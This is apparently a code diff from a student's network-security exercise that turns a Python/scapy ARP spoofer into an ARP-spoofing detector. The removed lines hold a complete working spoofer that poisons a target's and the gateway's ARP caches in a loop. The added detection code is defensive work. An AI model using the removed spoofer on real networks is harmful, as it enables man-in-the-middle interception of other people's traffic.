@@ -2,90 +2,121 @@
 # Yedidya Marashe 213661499
 
 from scapy.all import *
-import argparse
-import time
+import re
+from scapy.layers.l2 import Ether, ARP
+from termcolor import colored
+import platform
 
-# example usage:
-# sudo python3 ArpSpoofer.py -i eth0 -t 10.0.0.1 -d 5 -gw
+mac_address_regex = re.compile(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
+broadcast_mac_address = 'ff:ff:ff:ff:ff:ff'
+ARPisat = 2
 
-ARP_ISAT_CODE = 2
-IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"   
+indicators = {"I1": 0, "I2": 0, "I3": 0}
 
 
-def get_mac_by_ip(ip):
+def multiple_arp_answers(pkt):
     """
-    get MAC address of a specified IP.
+    - check if there are multiple answers for an ARP request
     """
-    if ip == "255.255.255.255":
-        return "ff:ff:ff:ff:ff:ff"
+    if pkt[ARP].op == ARPisat:
+        # send who has pkt with psrc from the arp pkt and if there are 2 answers we turn on the indicator
+        arp_who_has = Ether(dst=broadcast_mac_address) / ARP(pdst=pkt[ARP].psrc)
+        # receiver for response packets
+        sniffer = AsyncSniffer(lfilter=lambda p: ARP in p and p[ARP].psrc == arp_who_has[ARP].pdst)
+        sniffer.start()
+        sendp(arp_who_has, verbose=0)
+        time.sleep(2)
+        ans = sniffer.stop()
+        macs_in_ans = [p[Ether].src for p in ans]
 
-    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
-    response = srp1(arp_request, timeout=1, verbose=False)
-    if response:
-        return(response.src)
-    return None
+        if len(macs_in_ans) != len(set(macs_in_ans)):
+            return True
 
-def validate_ip_address(address):
+    return False
+
+
+def arp_table_contains_duplicates():
     """
-    Validate an ip address for argparse constraint matching.
+    - get ARP table and look for duplicate MAC entries with different IPs
     """
-    if re.match(IP_REGEX, address):
-        return address
-    raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')
+    if platform.system() == "Linux":
+        arp_table = open("/proc/net/arp", "r").read()
+        arp_table = arp_table.split('\n')
+        mac_addresses = []
+        for arp_line in arp_table:
+            if arp_line == '':
+                continue
+            arp_line = arp_line.split()
+            if re.match(mac_address_regex, arp_line[3]):
+                mac_addresses.append(arp_line[3])
+
+        if len(mac_addresses) != len(set(mac_addresses)):
+            return True
+
+    elif platform.system() == "Windows":
+        arp_table = os.popen("arp -a").read()
+        arp_table = arp_table.split("Interface")
+        for iface in arp_table:
+            mac_addresses = [line for line in re.findall('([-0-9a-f]{17})', iface) if line != "ff-ff-ff-ff-ff-ff"]
+            if len(mac_addresses) != len(set(mac_addresses)):
+                return True
+
+    return False
 
 
-def spoof(args : dict):
+
+def responds_to_ping_request(pkt):
     """
-    param args: dictionary of arguments.
-    supports: - interface (assuming valid)
-              - source (default is gateway)
-              - delay
-              - gw
-              - target(required)
+    - check if the host is responding to ping request
     """
-    # get gw ip
-    gw_ip = conf.route.route("0.0.0.0")[2]
-    # get target MAC address
-    target_mac = get_mac_by_ip(args['target'])
+    if pkt[ARP].op == ARPisat:
+        ping_pkt = Ether(dst=pkt[ARP].hwsrc) / IP(dst=pkt[ARP].psrc) / ICMP()
+        res = srp1(ping_pkt, timeout=1, verbose=0)
+        if not res:
+            return True
 
-    if not target_mac:
-        print("target IP mac address could not be resolved")
-        return
+    return False
 
-    # create the arp packet
-    arp_packets = list(Ether(dst=target_mac)/ARP(op=ARP_ISAT_CODE,pdst=args['target'],hwdst=target_mac,\
-                                                psrc=args['src'] if args['src'] else gw_ip))
 
-    # if gw is to be attacked as well, create a packet
-    if args['gw']:
-        # get gateway MAC address
-        gw_mac = get_mac_by_ip(gw_ip)
-        # create the arp packet
-        arp_packets.append(Ether(dst=gw_mac)/ARP(op=ARP_ISAT_CODE,pdst=gw_ip,hwdst=gw_mac,psrc=args['target']))
-    
-    # send the arp packets to the target every DELAY_TIME sec
-    while True:
-        sendp(arp_packets, iface=args['iface'], verbose=0)
-        for packet in arp_packets:
-            print(f"sent arp packet: {packet[ARP].psrc} is at {packet[ARP].hwsrc} to {packet[ARP].pdst}")
-        print('\n')
-        time.sleep(args["delay"])
-        
+def print_state():
+    if platform.system() in ["Linux", "Darwin"]:
+        os.system("clear")
+    elif platform.system() == "Windows":
+        os.system("cls")
+
+    print("The Following indicators are being reported:\n"
+          f"Host of Arp is_at packet not responding to a Ping request:  {colored(indicators['I1'], 'red')}\n"
+          f"Receiving multiple responses per one Arp who_has request:   {colored(indicators['I2'], 'red')}\n"
+          f"System Arp cache contains multiple IPs for the same MAC:    {colored(indicators['I3'], 'red')}\n")
+    if sum(indicators.values()) >= 2:
+        print("To the best of my knowledge, " + colored("YOU ARE BEING ARP-SPOOFED", "red"))
+    else:
+        print("To the best of my knowledge, " + colored("you're fine", "green"))
+
+
+class ArpSpoofDetectSession(DefaultSession):
+
+    def on_packet_received(self, pkt):
+        """
+        for every arp packet that comes through, check the following
+        - ping the host and see if there is a response
+        - check if there are multiple answers from ARP-ing host of is-at pkt
+        - check if system arp table contains duplicate MACs for different IPs
+        """
+        # INDICATOR 1: Host machine of is_at pkt not responding to ping req.
+        indicators["I1"] += int(responds_to_ping_request(pkt))
+        # INDICATOR 2: re-ARPing Host of is-at packet produces 2 responses
+        indicators["I2"] += int(multiple_arp_answers(pkt))
+        # INDICATOR 3: Arp table contains duplicate MACs for different IPs
+        indicators["I3"] += int(arp_table_contains_duplicates())
+        print_state()
 
 
 def main():
-    # initialize argument parser for command line
-    parser = argparse.ArgumentParser(description="Spoof ARP tables")
-    parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
-    parser.add_argument("-s","--src", type=validate_ip_address, help="The address you want for the attacker")
-    parser.add_argument("-d","--delay", type=float, default=1, help="Delay (in seconds) between messages")
-    parser.add_argument("-gw", action='store_true', help="should GW be attacked as well")
-    parser.add_argument("-t","--target", help="IP of target", type=validate_ip_address, required=True)
-    
-    args = parser.parse_args()
-    spoof(vars(args))
+    print_state()
+    sniff(lfilter=lambda pkt: (ARP in pkt and pkt[ARP].hwsrc != (Ether())[Ether].src),
+          session=ArpSpoofDetectSession)
 
 
-if __name__ == "__main__":
-    main()                                                                     
-
+if __name__ == '__main__':
+    main()
